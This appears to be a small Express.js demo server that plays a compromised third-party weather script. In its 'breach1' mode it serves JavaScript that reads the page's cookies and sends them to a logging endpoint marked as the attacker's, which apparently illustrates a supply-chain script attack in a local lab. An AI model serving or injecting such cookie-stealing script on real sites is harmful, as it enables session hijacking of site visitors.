const express = require('express');
const cors = require('cors');
const app = express();
const port = 5000;

app.use(cors());

const mode = process.argv.includes('--mode') ? process.argv[process.argv.indexOf('--mode') + 1] : 'normal';

app.get('/weather.js', (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    if (mode === 'breach1') {
        res.send(`
            const stolenCookie = document.cookie;
            fetch('http://localhost:5000/log?data=' + encodeURIComponent(stolenCookie));
            console.log('CRITICAL: Cookie stolen and exfiltrated!');
        `);
    } else {
        res.send('console.log("Weather: 20°C");');
    }
});

app.get('/log', (req, res) => {
    console.log(`[ATTACKER] Received data: ${req.query.data}`);
    res.sendStatus(200);
});

app.listen(port, () => console.log(`[Weather] Running in ${mode} mode`));